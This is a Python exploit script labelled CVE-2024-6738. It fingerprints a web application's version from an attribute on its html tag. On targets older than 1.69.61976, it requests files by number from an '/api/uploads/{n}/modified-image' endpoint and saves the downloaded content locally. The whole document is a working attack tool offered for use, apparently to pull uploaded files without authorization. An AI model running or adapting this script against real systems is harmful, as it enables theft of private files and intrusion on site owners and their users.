import sys
import requests
from bs4 import BeautifulSoup
import argparse
import pyfiglet

target_version = '1.69.61976'

def parse_args():
    parser = argparse.ArgumentParser(description='CVE-2024-6738')
    parser.add_argument('-u', '--url', help='URL to scan')
    parser.add_argument('-f', '--file_number', help='File number')
    parser.add_argument('-o', '--output_file', help='Output file')
    return parser.parse_args()

def check_target(url):
    soup = BeautifulSoup(requests.get(url).content, 'lxml')
    # print(soup)
    try:
        version = soup.html['version']
        print(f'[*] version: {version}')
        
        version_ref1 = float(version[0:4])
        version_ref2 = float(version[4:10])
        version_target1 = float(target_version[0:4])
        version_target2 = float(target_version[4:10])
        return True if version_ref1<version_target1 or (version_ref1==version_target1 and version_ref2<version_target2) else False
    except:
        print(f"[-] Failed to get [version]")
        return False

def create_payload(url, file_number):
    '''
        payload: {URL}/api/uploads/{file_number}/modified-image
    '''
    payload = f'{url}/api/uploads/{file_number}/modified-image'
    return payload

def main():
    print(pyfiglet.figlet_format("CVE-2024-6738"))

    args = parse_args()
    url = args.url
    file_number = args.file_number
    output_file = args.output_file

    if not url or not file_number:
        print(f"[-] Usage: python {sys.argv[0]} -u [URL] -f [file_number] -o [output_file]")
        return

    print(f'[*] URL: {url}')
    print(f'\t\\__ File number: {file_number}')
    print(f'[*] Output file: {output_file}')

    # check version #
    if not check_target(url):
        #logging.info("This target is wrong!")
        print("[-] This Target is wrong")
        return

    # send payload and get result #
    '''
        payload: {URL}/api/uploads/{file_number}/modified-image
    '''
    payload = create_payload(url, file_number)
    print(f"[*] payload: {payload}")

    response = requests.get(payload)
    if response.status_code == 200:
        if output_file:
            content_type = response.headers.get('Content-Type')
            if 'text/html' in content_type:
                extension = '.html'
            elif 'application/pdf' in content_type:
                extension = '.pdf'
            elif 'image/' in content_type:
                extension = '.'+content_type.split('/')[1]
            else:
                extension = '' 
            file_name = f'{output_file}{extension}'
        else:
            file_name = response.headers.get('Content-Disposition').split('filename')[1].strip('=').strip('"')
        # print(file_name)

        # save result
        file_content = response.content
        with open(file_name, "wb") as file:
            file.write(file_content)
        print(f"[+] Successfully downloaded file: {file_name}")

    else:
        print(f"[-] Failed to connect it!")

if __name__=='__main__':
    main()